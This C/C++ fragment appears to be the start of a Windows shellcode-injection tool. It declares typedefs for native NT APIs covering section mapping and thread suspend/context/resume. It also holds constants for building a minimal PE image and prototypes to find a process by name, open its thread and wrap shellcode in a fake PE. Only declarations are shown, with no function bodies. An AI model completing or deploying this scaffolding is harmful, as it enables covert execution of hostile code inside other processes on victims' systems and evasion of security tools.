

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <winnt.h>
#include <wchar.h>
#include <stdio.h>

#ifndef NTAPI
#define NTAPI __stdcall
#endif

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
    );
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    VOID* Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
    );
typedef NTSTATUS(NTAPI* pNtSuspendThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
    );
typedef NTSTATUS(NTAPI* pNtGetContextThread)(
    HANDLE ThreadHandle,
    PCONTEXT Context
    );
typedef NTSTATUS(NTAPI* pNtSetContextThread)(
    HANDLE ThreadHandle,
    PCONTEXT Context
    );
typedef NTSTATUS(NTAPI* pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
    );

#define IMAGE_SIZE 0x2000
#define ENTRY_RVA 0x1000
#define SECTION_VA 0x1000
#define PE_OFFSET 0x40
#define OPT_HEADER_SIZE 0xF0
#define SECTION_TABLE_OFFSET (PE_OFFSET + 4 + 20 + OPT_HEADER_SIZE)
#define SIZE_OF_HEADERS 0x200
#define SECTION_RAW_OFFSET 0x200

struct NativeApis {
    pNtCreateSection NtCreateSection;
    pNtMapViewOfSection NtMapViewOfSection;
    pNtUnmapViewOfSection NtUnmap;
    pNtSuspendThread NtSuspend;
    pNtGetContextThread NtGetContext;
    pNtSetContextThread NtSetContext;
    pNtResumeThread NtResume;
};

NativeApis apileriyukle();
DWORD pidd(const wchar_t* pn);
HANDLE threadial(NativeApis& apis, DWORD pid);
void Fakepeolustur(unsigned char* buffer, SIZE_T buffer_size, const unsigned char* sc, SIZE_T sc_size);
